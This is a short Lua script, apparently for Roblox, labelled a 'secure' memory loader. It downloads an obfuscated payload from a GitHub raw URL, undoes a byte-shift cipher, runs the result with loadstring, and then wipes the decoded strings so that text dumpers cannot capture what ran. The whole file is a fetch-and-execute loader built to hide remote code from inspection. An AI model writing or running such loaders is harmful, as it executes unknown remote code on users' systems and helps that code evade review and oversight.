--[[
    SECURE OFF-SCOPING MEMORY LOADER
    Bypasses text dumpers by decoding mathematical byte shifts.
--]]

local targetUrl = "https://raw.githubusercontent.com/ItzYumi/Games/refs/heads/main/scrambled_payload.lua"

-- Download the unreadable text from GitHub
local networkData = game:HttpGet(targetUrl, true)

if networkData and #networkData > 0 then
    -- Reverse the mathematical shift formula inside localized memory registers
    local decryptedBytes = {}
    for i = 1, #networkData do
        local byteVal = string.byte(networkData, i)
        local key = (i % 200) + 13
        decryptedBytes[i] = string.char((byteVal - key) % 256)
    end
    
    local cleanCodeToRun = table.concat(decryptedBytes)
    local nativeLoadstring = loadstring
    
    -- Compile and run the code safely
    local executable, err = nativeLoadstring(cleanCodeToRun, "=Runtime")
    
    -- Completely erase all raw text strings from RAM instantly so they vanish
    cleanCodeToRun = nil
    networkData = nil
    
    if executable then
        pcall(executable)
    else
        warn("Decryption wrapper compile error: " .. tostring(err))
    end
else
    warn("Failed to retrieve script source payload.")
end
